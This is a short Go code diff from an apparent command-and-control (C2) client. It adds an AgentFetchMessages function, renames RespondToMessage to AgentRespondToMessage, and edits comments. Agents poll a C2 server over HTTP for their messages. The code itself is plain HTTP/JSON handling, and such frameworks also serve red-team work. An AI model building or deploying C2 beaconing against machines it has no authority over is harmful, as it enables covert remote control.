@@ -6,7 +6,7 @@ import (
 	"net/http"
 )
 
-// FetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
+// FetchMessages will reach out to C2 server and fetch messages.
 func FetchMessages(agentID string) (messages []Message, err error) {
 	req, err := http.NewRequest("GET", BaseURL+"/v1/messages/"+agentID, nil)
 	if err != nil {
@@ -27,8 +27,27 @@ func FetchMessages(agentID string) (messages []Message, err error) {
 	return messages, nil
 }
 
-// RespondToMessage allows an agent to respond to a message.
-func RespondToMessage(messageID, response string) (err error) {
+// AgentFetchMessages will reach out to C2 server and fetch messages to which it has not reponded.
+func AgentFetchMessages(agentID string) (messages []Message, err error) {
+	req, err := http.NewRequest("GET", BaseURL+"/v1/messages/"+agentID, nil)
+	if err != nil {
+		return nil, err
+	}
+
+	resp, err := c.Do(req)
+	if err != nil {
+		return nil, err
+	}
+
+	if err = json.NewDecoder(resp.Body).Decode(&messages); err != nil {
+		return nil, err
+	}
+
+	return messages, nil
+}
+
+// AgentRespondToMessage allows an agent to respond to a message.
+func AgentRespondToMessage(messageID, response string) (err error) {
 	var msgRespCtx struct {
 		MessageID string `json:"messageId"`
 		Response  string `json:"response"`
